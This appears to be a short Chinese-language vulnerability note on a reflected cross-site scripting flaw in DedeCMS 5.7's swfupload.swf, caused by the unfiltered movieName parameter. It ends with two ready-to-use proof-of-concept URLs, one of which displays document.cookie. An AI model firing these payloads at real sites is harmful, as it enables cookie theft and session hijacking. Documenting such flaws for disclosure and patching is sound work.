Dedecms swf文件反射型xss
========================

一、漏洞简介
------------

DedeCMS 5.7
/images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。

二、漏洞影响
------------

三、复现过程
------------

### 代码分析

详细说明：

Location: /uploads/images/swfupload/swfupload.swf

漏洞文件为：http://www.dedecms.com/images/swfupload/swfupload.swf

这个flash文件存在漏洞，此文件漏洞可参考:https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/

### 复现

    /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22ian最帅%22%29}}// 

    /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}//
